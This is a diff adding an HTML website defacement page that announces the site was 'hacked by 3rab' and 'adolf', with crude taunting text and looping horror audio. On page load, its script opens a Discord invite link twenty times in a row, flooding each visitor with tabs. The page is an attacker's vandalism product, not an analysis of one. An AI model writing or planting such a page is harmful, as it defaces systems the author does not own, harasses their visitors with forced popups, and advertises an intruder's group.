@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HACKED BY 3RAB</title>
+  <style>
+    @keyframes severe-glitch {
+      0% { opacity: 0.9; transform: translate(0, 0) skew(0deg); filter: hue-rotate(0deg); }
+      10% { opacity: 0.4; transform: translate(-4px, 3px) skew(2deg); filter: hue-rotate(90deg) contrast(200%); }
+      20% { opacity: 1; transform: translate(3px, -2px) skew(-3deg); filter: hue-rotate(0deg); }
+      30% { opacity: 0.2; transform: translate(-5px, -4px) skew(5deg); filter: invert(30%); }
+      40% { opacity: 0.9; transform: translate(2px, 2px) skew(0deg); filter: hue-rotate(180deg); }
+      50% { opacity: 0.6; transform: translate(-2px, -3px) skew(-2deg); filter: contrast(300%); }
+      60% { opacity: 1; transform: translate(4px, 1px) skew(1deg); filter: hue-rotate(0deg); }
+      80% { opacity: 0.3; transform: translate(-3px, 4px) skew(-4deg); filter: invert(20%); }
+      100% { opacity: 0.9; transform: translate(0, 0) skew(0deg); filter: hue-rotate(0deg); }
+    }
+
+    @keyframes blood-pulse {
+      0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #990000; }
+      50% { text-shadow: 0 0 20px #ff3333, 0 0 40px #ff0000, 0 0 60px #550000; }
+      100% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #990000; }
+    }
+
+    body {
+      background-color: #000000;
+      color: #ff0000;
+      font-family: 'Courier New', Courier, monospace;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      animation: severe-glitch 0.15s infinite;
+    }
+
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      z-index: 10;
+    }
+
+    .logo {
+      width: 230px;
+      height: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 40px #ff0000, inset 0 0 15px #ff0000;
+      filter: grayscale(40%) contrast(180%) brightness(90%);
+      animation: blood-pulse 2s infinite;
+    }
+
+    .sys-text {
+      color: #ff1a1a;
+      font-weight: bold;
+      margin-top: 22px;
+      font-size: 1.4rem;
+      animation: blood-pulse 1s infinite;
+      letter-spacing: 2px;
+    }
+
+    .hacked-title {
+      font-size: 32px;
+      font-weight: bold;
+      margin: 12px 0;
+      color: #ffffff;
+      animation: blood-pulse 1.5s infinite;
+      letter-spacing: 3px;
+    }
+
+    .arabic-text {
+      font-size: 22px;
+      margin-bottom: 15px;
+      color: #ff4d4d;
+      text-shadow: 0 0 15px #ff0000;
+      font-weight: bold;
+    }
+
+    .discord-sec {
+      margin-top: 15px;
+      font-size: 1.2rem;
+    }
+
+    .discord-sec a {
+      color: #00ffff;
+      text-decoration: none;
+      border-bottom: 2px dashed #00ffff;
+      text-shadow: 0 0 10px #00ffff;
+    }
+
+    .footer-text {
+      position: absolute;
+      bottom: 25px;
+      font-weight: bold;
+      color: #ff0000;
+      text-shadow: 0 0 15px #ff0000;
+      z-index: 10;
+      letter-spacing: 3px;
+      font-size: 1.1rem;
+    }
+
+    .bg-video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: 1;
+      opacity: 0.3;
+      filter: invert(20%) hue-rotate(290deg) contrast(150%);
+    }
+  </style>
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      // تشغيل الفيديو والصوت في الخلفية
+      var video = document.getElementById('bgVideo');
+      if (video) video.play().catch(e => {});
+
+      var audio = document.getElementById('horrorAudio');
+      if (audio) audio.play().catch(e => {});
+
+      // فتح رابط الديسكورد 20 مرة متتالية فور دخول الصفحة
+      for (let i = 0; i < 20; i++) {
+        window.open("https://discord.gg/adolf", "_blank");
+      }
+    });
+  </script>
+</head>
+<body>
+
+  <video id="bgVideo" class="bg-video" loop muted playsinline>
+    <source src="video.mp4" type="video/mp4">
+  </video>
+
+  <div class="main-container">
+    <img class="logo" alt="3RAB Logo" src="skull.gif">
+
+    <div class="sys-text">
+      ^system^ hacked byy 3rab
+    </div>
+
+    <div>
+      <div class="hacked-title">
+        hacked byy adolf
+      </div>
+
+      <div dir="rtl" class="arabic-text">
+        You Got Fucked By Adolf
+      </div>
+
+      <div class="discord-sec">
+        Discord:
+        <a href="https://discord.gg/adolf" rel="noopener noreferrer" target="_blank">
+          https://discord.gg/adolf
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer-text">
+    HACKED BY ADOLF
+  </div>
+
+  <audio id="horrorAudio" autoplay loop preload="auto">
+    <source src="sound.wav" type="audio/wav">
+  </audio>
+
+</body>
+</html>
